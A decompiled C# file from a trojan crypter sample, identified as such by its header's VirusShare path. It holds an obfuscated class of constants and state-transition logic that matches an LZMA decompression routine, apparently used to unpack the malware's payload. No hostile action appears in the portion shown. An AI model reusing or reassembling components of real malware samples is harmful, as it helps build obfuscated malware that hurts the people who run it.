// Decompiled with JetBrains decompiler
// Type: .

// Assembly: !, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557A2E9F-07C1-4548-9113-1357BAD65653
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Crypt.hnss-93ea8c725747bfd67919febc6ed26643a8654b90a112977a3d914bf034f69ed8.exe

namespace \u0001\u0004
{
  internal abstract class \u0004\u000A
  {
    public const uint \u0005\u0005 = 4;
    public const uint \u0005\u0006 = 12;
    public const int \u0005 = 6;
    public const int \u0004\u000F = 0;
    public const int \u0004\u0017 = 2;
    public const uint \u0004\u0018 = 4;
    public const uint \u0004\u0012 = 2;
    public const int \u0004\u0013 = 4;
    public const uint \u0004\u000E = 16;
    public const uint \u0004\u000D = 15;
    public const uint \u0005\u0007 = 4;
    public const uint \u0004\u0010 = 14;
    public const uint \u0004\u001F = 10;
    public const uint \u0004\u0014 = 128;
    public const uint \u0004\u001A = 4;
    public const uint \u0004\u0019 = 8;
    public const int \u0005\u0002 = 4;
    public const uint \u0005\u0004 = 16;
    public const int \u0005\u0001 = 4;
    public const uint \u0005\u0003 = 16;
    public const int \u0004\u001B = 3;
    public const int \u0004\u001D = 3;
    public const int \u0004\u0015 = 8;
    public const uint \u0004\u001C = 8;
    public const uint \u0004\u001E = 8;
    public const uint \u0004\u0016 = 272;
    public const uint \u0004\u0011 = 273;

    public static uint \u0004\u000C(uint len)
    {
      len -= 2U;
      return len < 4U ? len : 3U;
    }

    public struct \u0005\u0012
    {
      public uint \u000B;

      public void \u0001\u001B() => this.\u000B = 0U;

      public void \u0005\u000A()
      {
        if (this.\u000B < 4U)
          this.\u000B = 0U;
        else if (this.\u000B < 10U)
          this.\u000B -= 3U;
        else
          this.\u000B -= 6U;
      }

      public void \u0005\u000B() => this.\u000B = this.\u000B < 7U ? 7U : 10U;

      public void \u0005\u000C() => this.\u000B = this.\u000B < 7U ? 8U : 11U;

      public void \u0005\u000D() => this.\u000B = this.\u000B < 7U ? 9U : 11U;

      public bool \u0005\u0008() => this.\u000B < 7U;
    }
  }
}
